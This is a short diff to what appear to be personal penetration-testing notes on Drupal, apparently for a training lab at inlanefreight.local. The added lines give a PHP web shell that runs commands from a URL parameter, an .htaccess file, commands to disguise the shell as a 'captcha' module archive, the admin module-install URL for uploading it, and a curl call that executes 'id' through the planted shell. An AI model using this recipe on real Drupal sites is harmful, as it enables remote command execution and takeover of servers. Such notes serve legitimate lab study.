@@ -64,5 +64,25 @@ Drupal:
 
   curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 "Drupal"
     -m2  显示最先出现的2个
+
+  ***
+  https://www.drupal.org/project/captcha
+
+  <?php
+  system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
+  ?>
+
+  <IfModule mod_rewrite.c>
+  RewriteEngine On
+  RewriteBase /
+  </IfModule>
   
+  mv shell.php .htaccess captcha
+  tar cvf captcha.tar.gz captcha/
+
+  http://drupal.inlanefreight.local/admin/modules/install
+
+  curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+  ***
+
   
